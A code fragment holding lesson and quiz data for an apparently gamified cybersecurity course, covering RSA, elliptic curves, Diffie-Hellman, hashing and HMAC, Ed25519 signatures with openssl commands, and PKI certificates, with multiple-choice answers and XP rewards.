              { type: "code", language: "text", content: "RSA Key Generation:\n1. Choose two large primes: p, q\n2. Compute n = p × q (modulus)\n3. Compute φ(n) = (p-1)(q-1)\n4. Choose e where 1 < e < φ(n), gcd(e, φ(n)) = 1\n5. Compute d = e⁻¹ mod φ(n)\n\nPublic key: (n, e)  |  Private key: (n, d)" },
              { type: "alert", variant: "warning", content: "RSA keys shorter than 2048 bits are considered insecure. NIST recommends 3072+ bits for protection beyond 2030." },
            ],
            challenges: [
              {
                id: "ch-rsa-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What mathematical problem provides the security foundation for RSA?",
                options: ["Discrete logarithm", "Integer factorization", "Elliptic curve discrete log", "Shortest vector problem"], correctAnswer: "Integer factorization",
                explanation: "RSA security depends on the computational difficulty of factoring the product of two large prime numbers.",
              },
              {
                id: "ch-rsa-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What is the minimum recommended RSA key size for current security standards?",
                options: ["1024 bits", "2048 bits", "4096 bits", "512 bits"], correctAnswer: "2048 bits",
                explanation: "NIST and other standards bodies require a minimum of 2048-bit RSA keys, with 3072+ recommended for long-term security.",
              },
            ],
          },
          {
            id: "lesson-ecc",
            title: "Elliptic Curve Cryptography",
            order: 5,
            content: [
              { type: "text", content: "ECC achieves equivalent security to RSA with much smaller key sizes. A 256-bit ECC key provides security comparable to a 3072-bit RSA key. Operations are based on the algebraic structure of elliptic curves over finite fields." },
              { type: "list", items: ["P-256 (secp256r1): NIST standard curve, widely supported", "Curve25519: designed by Daniel Bernstein, resistant to timing attacks", "ECDSA: elliptic curve variant of DSA for digital signatures", "ECDH: elliptic curve Diffie-Hellman for key agreement"] },
              { type: "alert", variant: "info", content: "Curve25519 and Ed25519 are preferred for modern applications due to their resistance to implementation errors and side-channel attacks." },
            ],
            challenges: [
              {
                id: "ch-ecc-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What is the primary advantage of ECC over RSA?",
                options: ["Faster encryption", "Smaller key sizes for equivalent security", "Better compatibility", "Simpler implementation"], correctAnswer: "Smaller key sizes for equivalent security",
                explanation: "A 256-bit ECC key provides security equivalent to a 3072-bit RSA key, reducing computational and bandwidth requirements.",
              },
              {
                id: "ch-ecc-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Which elliptic curve is recommended for modern applications due to its resistance to side-channel attacks?",
                options: ["P-256", "P-384", "Curve25519", "secp256k1"], correctAnswer: "Curve25519",
                explanation: "Curve25519 was designed to be fast, secure, and resistant to timing attacks and implementation errors.",
              },
            ],
          },
          {
            id: "lesson-key-exchange",
            title: "Key Exchange Protocols",
            order: 6,
            content: [
              { type: "text", content: "Key exchange protocols allow two parties to establish a shared secret over an insecure channel. Diffie-Hellman uses modular exponentiation, while ECDHE uses elliptic curve operations. Ephemeral variants generate new keys per session, providing forward secrecy." },
              { type: "code", language: "text", content: "Diffie-Hellman Key Exchange:\n1. Agree on prime p and generator g\n2. Alice: a = random, sends A = g^a mod p\n3. Bob:   b = random, sends B = g^b mod p\n4. Alice computes: secret = B^a mod p\n5. Bob computes:   secret = A^b mod p\n// Both derive the same shared secret" },
              { type: "alert", variant: "info", content: "Forward secrecy ensures that compromising a long-term key does not compromise past session keys. Always prefer ephemeral (DHE/ECDHE) over static DH." },
            ],
            challenges: [
              {
                id: "ch-kex-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What security property does ephemeral Diffie-Hellman (DHE) provide that static DH does not?",
                options: ["Confidentiality", "Integrity", "Forward secrecy", "Authentication"], correctAnswer: "Forward secrecy",
                explanation: "Ephemeral DH generates new key pairs per session, so compromising the long-term key cannot decrypt past sessions.",
              },
              {
                id: "ch-kex-2", type: "true-false", difficulty: "Advanced", xpReward: 75,
                question: "Static Diffie-Hellman key exchange provides forward secrecy.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "Static DH reuses the same private key across sessions. If that key is compromised, all past sessions can be decrypted.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-applications",
        title: "Cryptographic Applications",
        lessons: [
          {
            id: "lesson-hashing",
            title: "Hash Functions and MACs",
            order: 7,
            content: [
              { type: "text", content: "Cryptographic hash functions map arbitrary-length input to a fixed-length digest. They must provide preimage resistance (can't reverse), second preimage resistance (can't find another input with the same hash), and collision resistance (can't find any two inputs with the same hash)." },
              { type: "code", language: "bash", content: "# SHA-256 hash\necho -n 'password' | sha256sum\n# 5e884898da28047151d0e56f8dc6292773603d0d...\n\n# HMAC-SHA256 with key\necho -n 'message' | openssl dgst -sha256 -hmac 'secret-key'" },
              { type: "list", items: ["SHA-256: 256-bit output, widely used for integrity verification", "SHA-3: latest NIST standard, different internal structure (Keccak)", "HMAC: combines a hash with a secret key for message authentication", "Never use MD5 or SHA-1 for security - both have practical collision attacks"] },
            ],
            challenges: [
              {
                id: "ch-hash-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Which hash function property guarantees that no two different inputs produce the same output?",
                options: ["Preimage resistance", "Second preimage resistance", "Collision resistance", "Avalanche effect"], correctAnswer: "Collision resistance",
                explanation: "Collision resistance means it is computationally infeasible to find any two distinct inputs that hash to the same output.",
              },
              {
                id: "ch-hash-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What construction combines a cryptographic hash function with a secret key for message authentication?",
                options: ["Digital signature", "HMAC", "Salt", "KDF"], correctAnswer: "HMAC",
                explanation: "HMAC (Hash-based Message Authentication Code) uses a secret key with a hash function to verify both integrity and authenticity.",
              },
            ],
          },
          {
            id: "lesson-signatures",
            title: "Digital Signatures",
            order: 8,
            content: [
              { type: "text", content: "Digital signatures provide authentication, integrity, and non-repudiation. The signer hashes the message and encrypts the hash with their private key. Anyone with the public key can verify the signature, confirming the message is unaltered and came from the claimed sender." },
              { type: "code", language: "bash", content: "# Generate Ed25519 key pair\nopenssl genpkey -algorithm Ed25519 -out private.pem\nopenssl pkey -in private.pem -pubout -out public.pem\n\n# Sign a file\nopenssl pkeyutl -sign -inkey private.pem -in document.txt -out signature.bin\n\n# Verify signature\nopenssl pkeyutl -verify -pubin -inkey public.pem -in document.txt -sigfile signature.bin" },
              { type: "alert", variant: "info", content: "EdDSA (Ed25519) is preferred over ECDSA for new applications because it is deterministic, faster, and resistant to nonce-reuse attacks." },
            ],
            challenges: [
              {
                id: "ch-sig-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What do digital signatures primarily prove about a message?",
                options: ["Confidentiality", "Availability", "Authenticity and integrity", "Encryption strength"], correctAnswer: "Authenticity and integrity",
                explanation: "Digital signatures verify that the message was created by the claimed sender (authenticity) and has not been modified (integrity).",
              },
              {
                id: "ch-sig-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Which digital signature scheme uses Edwards curves and is deterministic by design?",
                options: ["RSA-PSS", "ECDSA", "EdDSA", "DSA"], correctAnswer: "EdDSA",
                explanation: "EdDSA (Edwards-curve Digital Signature Algorithm) uses Ed25519 or Ed448 curves and produces deterministic signatures, eliminating nonce-related vulnerabilities.",
              },
            ],
          },
          {
            id: "lesson-pki",
            title: "PKI and Certificates",
            order: 9,
            content: [
              { type: "text", content: "Public Key Infrastructure (PKI) binds public keys to identities through digital certificates issued by Certificate Authorities (CAs). Browsers trust a set of root CAs, and each certificate forms a chain of trust from the server certificate to a trusted root." },
              { type: "list", items: ["Root CAs: self-signed, embedded in operating systems and browsers", "Intermediate CAs: signed by roots, issue end-entity certificates", "Certificate pinning: restricts which CAs can issue certs for your domain", "OCSP/CRL: mechanisms to check if a certificate has been revoked"] },
              { type: "alert", variant: "warning", content: "A compromised CA can issue fraudulent certificates for any domain. Certificate Transparency logs help detect unauthorized certificate issuance." },
            ],
            challenges: [
              {
                id: "ch-pki-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "How does a browser validate that a TLS certificate is trustworthy?",
                options: ["By checking the file size", "By verifying the certificate chain to a trusted root CA", "By pinging the server", "By checking the domain expiry"], correctAnswer: "By verifying the certificate chain to a trusted root CA",
                explanation: "The browser follows the chain of signatures from the server certificate through intermediate CAs to a root CA embedded in its trust store.",
              },
              {
                id: "ch-pki-2", type: "true-false", difficulty: "Advanced", xpReward: 75,
                question: "Certificate pinning prevents man-in-the-middle attacks that use certificates from rogue or compromised Certificate Authorities.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "Certificate pinning restricts which CAs or certificates are accepted for a domain, blocking fraudulent certificates even from trusted CAs.",
              },
            ],
          },
        ],
      },
    ],
  },
  LINUX_FUNDAMENTALS_COURSE,
  WINDOWS_FUNDAMENTALS_COURSE,
  BRUTEFORCE_CONCEPTS_COURSE,
];
